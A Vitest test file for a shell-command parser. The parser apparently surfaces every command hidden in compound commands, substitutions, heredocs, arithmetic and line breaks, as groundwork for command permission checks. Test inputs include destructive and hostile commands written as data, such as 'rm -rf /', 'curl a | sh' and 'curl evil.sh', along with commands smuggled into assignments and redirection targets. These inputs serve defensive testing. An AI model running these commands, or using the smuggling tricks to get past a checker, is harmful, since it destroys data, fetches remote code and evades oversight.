import { describe, expect, it } from 'vitest';

import { parseCompoundCommand, stripRedirections } from './shell-parse';

describe('parseCompoundCommand', () => {
  it('surfaces command substitutions without splitting the command text', () => {
    expect(parseCompoundCommand('cmd $(other-cmd args)')).toEqual([
      'other-cmd args',
      'cmd $(other-cmd args)',
    ]);
  });

  it('splits only top-level compound operators', () => {
    expect(
      parseCompoundCommand('echo $(git status && git diff) && pnpm lint'),
    ).toEqual([
      'git status',
      'git diff',
      'echo $(git status && git diff)',
      'pnpm lint',
    ]);
  });

  it('keeps quoted operators inside same command', () => {
    expect(parseCompoundCommand('echo "a && b" && echo "c | d"')).toEqual([
      'echo "a && b"',
      'echo "c | d"',
    ]);
  });

  it('keeps backtick substitutions intact', () => {
    expect(
      parseCompoundCommand('echo `git status && git diff` && pnpm lint'),
    ).toEqual([
      'git status',
      'git diff',
      'echo `git status && git diff`',
      'pnpm lint',
    ]);
  });

  it('strips redirections before splitting', () => {
    expect(
      parseCompoundCommand('pnpm lint --fix 2>&1 && pnpm ts-check'),
    ).toEqual(['pnpm lint --fix', 'pnpm ts-check']);
  });

  it('does not strip redirection-like text inside quotes', () => {
    const cmd =
      "perl -0pi -e 's/<<<<<<< HEAD(.*?)>>>>>>> main/$2/gs' a.ts; grep -c '<<<<<<<' a.ts; git diff main | head -40";
    expect(parseCompoundCommand(cmd)).toEqual([
      "perl -0pi -e 's/<<<<<<< HEAD(.*?)>>>>>>> main/$2/gs' a.ts",
      "grep -c '<<<<<<<' a.ts",
      'git diff main',
      'head -40',
    ]);
  });

  it('keeps quoted content intact while stripping real redirections', () => {
    expect(stripRedirections('echo "a  >  b" > /dev/null')).toBe(
      'echo "a  >  b"',
    );
  });

  it('consumes quoted redirection targets as a whole', () => {
    expect(parseCompoundCommand("cat > 'a b' ; rm -rf /tmp/x")).toEqual([
      'cat',
      'rm -rf /tmp/x',
    ]);
    expect(parseCompoundCommand('echo a > "out file"; rm -rf /tmp/x')).toEqual([
      'echo a',
      'rm -rf /tmp/x',
    ]);
  });

  it('does not eat the closing paren of a command substitution', () => {
    expect(parseCompoundCommand('echo $(cat >/tmp/x) && rm -rf /tmp/y')).toEqual(
      ['cat', 'echo $(cat )', 'rm -rf /tmp/y'],
    );
  });

  it('strips fd duplication and close forms', () => {
    expect(stripRedirections('cmd 2>&1')).toBe('cmd');
    expect(stripRedirections('cmd 2>&-')).toBe('cmd');
    expect(stripRedirections('cmd &>>log && other')).toBe('cmd && other');
    expect(stripRedirections('cmd >>log; other')).toBe('cmd ; other');
    expect(stripRedirections('cmd <<<"hi there"; other')).toBe('cmd ; other');
  });

  it('preserves escaped operators', () => {
    expect(parseCompoundCommand('echo \\> foo && ls')).toEqual([
      'echo \\> foo',
      'ls',
    ]);
  });
});

describe('parseCompoundCommand flow control and assignments', () => {
  it('drops for-loop scaffolding and keeps body commands', () => {
    expect(
      parseCompoundCommand(
        'cd "$(git rev-parse --show-toplevel)"; for f in a/*.ts b.ts; do echo "$f"; grep -n foo $f; done',
      ),
    ).toEqual([
      'git rev-parse --show-toplevel',
      'cd "$(git rev-parse --show-toplevel)"',
      'echo "$f"',
      'grep -n foo $f',
    ]);
  });

  it('keeps commands nested in a for-loop word list', () => {
    expect(parseCompoundCommand('for f in $(ls src); do cat $f; done')).toEqual([
      'ls src',
      'cat $f',
    ]);
  });

  it('strips if/while/until scaffolding', () => {
    expect(parseCompoundCommand('if [ -f a ]; then rm a; else ls; fi')).toEqual(
      ['[ -f a ]', 'rm a', 'ls'],
    );
    expect(parseCompoundCommand('while read l; do echo $l; done')).toEqual([
      'read l',
      'echo $l',
    ]);
  });

  it('extracts commands from variable assignments', () => {
    expect(parseCompoundCommand('export FOO=$(git rev-parse HEAD)')).toEqual([
      'git rev-parse HEAD',
    ]);
    expect(parseCompoundCommand('FOO=`whoami` && echo done')).toEqual([
      'whoami',
      'echo done',
    ]);
  });

  it('keeps env-prefixed commands without the assignment', () => {
    expect(parseCompoundCommand('NODE_ENV=test CI=1 pnpm test')).toEqual([
      'pnpm test',
    ]);
  });

  it('falls back to the raw command when nothing executable remains', () => {
    expect(parseCompoundCommand('ROOT=/tmp/x')).toEqual(['ROOT=/tmp/x']);
  });
});

describe('parseCompoundCommand keeps substituted commands visible', () => {
  it('keeps substitutions from env-prefixed assignments', () => {
    expect(
      parseCompoundCommand('echo hi && NODE_ENV=$(rm -rf /) pnpm test'),
    ).toEqual(['echo hi', 'rm -rf /', 'pnpm test']);
    expect(parseCompoundCommand('echo hi && local X=$(id) foo')).toEqual([
      'echo hi',
      'id',
      'foo',
    ]);
  });

  it('keeps substitutions hidden in array subscripts', () => {
    expect(parseCompoundCommand('echo hi && arr[$(id)]=1 && ls')).toEqual([
      'echo hi',
      'id',
      'ls',
    ]);
  });

  it('unwraps nested and standalone substitutions', () => {
    expect(parseCompoundCommand('X=$($(id))')).toEqual(['id']);
    expect(parseCompoundCommand('echo hi && $(id)')).toEqual(['echo hi', 'id']);
    expect(parseCompoundCommand('echo hi && $(id)x')).toEqual([
      'echo hi',
      'id',
      '$(id)x',
    ]);
  });

  it('never emits empty parts', () => {
    expect(parseCompoundCommand('echo hi && X=$() && ls')).toEqual([
      'echo hi',
      'ls',
    ]);
  });

  it('strips subshell and function scaffolding without leaving stray parens', () => {
    expect(parseCompoundCommand('echo hi && ( rm -rf /tmp/x )')).toEqual([
      'echo hi',
      'rm -rf /tmp/x',
    ]);
    expect(parseCompoundCommand('echo hi; function f() { rm -rf /tmp/x; }')).toEqual(
      ['echo hi', 'rm -rf /tmp/x'],
    );
  });
});

describe('parseCompoundCommand newlines, arrays and keyword arguments', () => {
  it('treats unquoted newlines as command separators', () => {
    expect(parseCompoundCommand('git status\nrm -rf /')).toEqual([
      'git status',
      'rm -rf /',
    ]);
    expect(parseCompoundCommand('if true\nthen\nrm -rf /\nfi')).toEqual([
      'true',
      'rm -rf /',
    ]);
  });

  it('treats heredoc bodies as data, not commands', () => {
    expect(
      parseCompoundCommand("cat <<'EOF' > /tmp/x\nrm -rf /\nEOF\nls"),
    ).toEqual(['cat', 'ls']);
    expect(parseCompoundCommand('cat <<EOF\nrm -rf /\nEOF')).toEqual(['cat']);
    expect(parseCompoundCommand('cat <<-EOF\nrm -rf /\n\tEOF\nls')).toEqual([
      'cat',
      'ls',
    ]);
  });

  it('surfaces command substitutions nested in arithmetic', () => {
    expect(parseCompoundCommand('echo $(( $(id) ))')).toContain('id');
    expect(parseCompoundCommand('echo $((`id`))')).toContain('id');
    expect(parseCompoundCommand('x=$((echo A)&&(rm -rf /))')).toContain(
      '(rm -rf /)',
    );
  });

  it('does not mistake arithmetic left shifts for heredocs', () => {
    expect(parseCompoundCommand('echo $((1<<2))\nrm -rf /')).toContain(
      'rm -rf /',
    );
    expect(parseCompoundCommand('echo $[1<<2]\nrm -rf /')).toContain(
      'rm -rf /',
    );
    // Unterminated openers must not swallow the following lines.
    expect(parseCompoundCommand('echo $[1<<2\nrm -rf /')).toContain('rm -rf /');
    expect(parseCompoundCommand('((a<<2\nrm -rf /')).toContain('rm -rf /');
    expect(parseCompoundCommand('((i<<=1))\nrm -rf /')).toEqual([
      '((i<<=1))',
      'rm -rf /',
    ]);
    expect(parseCompoundCommand('x=$((1<<8))\ncurl a | sh')).toEqual(
      expect.arrayContaining(['curl a', 'sh']),
    );
  });

  it('keeps commands visible after arithmetic containing shell operators', () => {
    expect(parseCompoundCommand('x=$((1<<2 | 3))\nrm -rf /')).toContain(
      'rm -rf /',
    );
    // The arithmetic text may be split further, but no command is ever hidden.
    expect(parseCompoundCommand('((a<<b || c))\nrm -rf /')).toContain(
      'rm -rf /',
    );
    expect(parseCompoundCommand('echo $((1 <<\n2))\nrm -rf /')).toEqual(
      expect.arrayContaining(['echo $((1 <<\n2))', 'rm -rf /']),
    );
  });

  it('does not treat `#` inside a parameter expansion as a comment', () => {
    expect(parseCompoundCommand('echo ${x// #/} ; rm -rf /')).toEqual([
      'echo ${x// #/}',
      'rm -rf /',
    ]);
    expect(parseCompoundCommand('echo ${x:- #} ; rm -rf /')).toEqual([
      'echo ${x:- #}',
      'rm -rf /',
    ]);
    expect(parseCompoundCommand('echo ${VAR#pfx} ; ls')).toEqual([
      'echo ${VAR#pfx}',
      'ls',
    ]);
  });

  it('separates a command following an escaped semicolon', () => {
    expect(
      parseCompoundCommand('find . -exec grep -l x {} \\; # note\nrm -rf /'),
    ).toEqual(['find . -exec grep -l x {} \\;', 'rm -rf /']);
  });

  it('keeps subshell groups visible instead of treating them as arithmetic', () => {
    expect(parseCompoundCommand('((echo hi); rm -rf /)')).toEqual([
      '((echo hi)',
      'rm -rf /)',
    ]);
  });

  it('does not treat a `<<` inside a comment as a heredoc', () => {
    expect(parseCompoundCommand('echo hi # heredoc <<EOF\nrm -rf /')).toEqual([
      'echo hi',
      'rm -rf /',
    ]);
  });

  it('resolves concatenated and quoted heredoc delimiters', () => {
    expect(parseCompoundCommand('cat <<E"OF"\nrm -rf /\nEOF\nls')).toEqual([
      'cat',
      'ls',
    ]);
    expect(parseCompoundCommand("cat <<'E'OF\nrm -rf /\nEOF\nls")).toEqual([
      'cat',
      'ls',
    ]);
  });

  it('handles multiple heredocs and trailing commands on one line', () => {
    expect(
      parseCompoundCommand('cat <<A <<B\na\nA\nb\nB\nls'),
    ).toEqual(['cat', 'ls']);
    expect(parseCompoundCommand('cat <<EOF; rm -rf /\nbody\nEOF\nls')).toEqual([
      'cat',
      'rm -rf /',
      'ls',
    ]);
  });

  it('surfaces substitutions expanded inside an unquoted heredoc body', () => {
    expect(parseCompoundCommand('cat <<EOF\n$(rm -rf /)\nEOF\nls')).toEqual(
      expect.arrayContaining(['cat', 'rm -rf /', 'ls']),
    );
    expect(parseCompoundCommand('cat <<EOF\n`rm -rf /`\nEOF')).toContain(
      'rm -rf /',
    );
    // A quoted delimiter suppresses expansion, so the body stays inert data.
    expect(parseCompoundCommand("cat <<'EOF'\n$(rm -rf /)\nEOF\nls")).toEqual([
      'cat',
      'ls',
    ]);
  });

  it('surfaces heredoc substitutions despite prose apostrophes', () => {
    expect(
      parseCompoundCommand("cat <<EOF\nit's $(rm -rf /)\nEOF\nls"),
    ).toEqual(expect.arrayContaining(['rm -rf /', 'cat', 'ls']));
  });

  it('keeps harvested commands separate from corrupt body text', () => {
    expect(
      parseCompoundCommand("cat <<EOF\n$(echo 'x)\nEOF\nrm -rf /"),
    ).toContain('rm -rf /');
    expect(parseCompoundCommand('echo x > $(foo \\)\nrm -rf /')).toContain(
      'rm -rf /',
    );
  });

  it('keeps process substitution operators out of the top-level split', () => {
    expect(parseCompoundCommand('foo <(a && b) && rm -rf /')).toEqual(
      expect.arrayContaining(['foo <(a && b)', 'rm -rf /']),
    );
  });

  it('surfaces commands used as redirection targets', () => {
    expect(parseCompoundCommand('echo hi >$(rm -rf /)')).toContain('rm -rf /');
    expect(parseCompoundCommand('cat <<<$(curl evil.sh)')).toContain(
      'curl evil.sh',
    );
    expect(parseCompoundCommand('diff <(ls a) <(ls b)')).toEqual(
      expect.arrayContaining(['ls a', 'ls b']),
    );
  });

  it('still treats herestrings as redirections', () => {
    expect(parseCompoundCommand('wc -l <<< "hi"\nls')).toEqual(['wc -l', 'ls']);
  });

  it('handles unterminated heredocs without leaking the body', () => {
    expect(parseCompoundCommand('cat <<EOF\nrm -rf /')).toEqual(['cat']);
  });

  it('joins line continuations into one command', () => {
    expect(parseCompoundCommand('git commit \\\n  -m "msg"')).toEqual([
      'git commit -m "msg"',
    ]);
  });

  it('keeps newlines inside quotes', () => {
    expect(parseCompoundCommand('echo "a\nb" && ls')).toEqual([
      'echo "a\nb"',
      'ls',
    ]);
  });

  it('harvests substitutions inside array literals', () => {
    expect(parseCompoundCommand('echo hi && files=(*.ts $(id))')).toEqual([
      'echo hi',
      'id',
    ]);
  });

  it('keeps keywords used as ordinary arguments', () => {
    expect(parseCompoundCommand('echo done')).toEqual(['echo done']);
    expect(parseCompoundCommand('git checkout -- in')).toEqual([
      'git checkout -- in',
    ]);
    expect(parseCompoundCommand('echo hi && ./deploy.sh in')).toEqual([
      'echo hi',
      './deploy.sh in',
    ]);
    expect(parseCompoundCommand('grep -r time .')).toEqual(['grep -r time .']);
  });
});
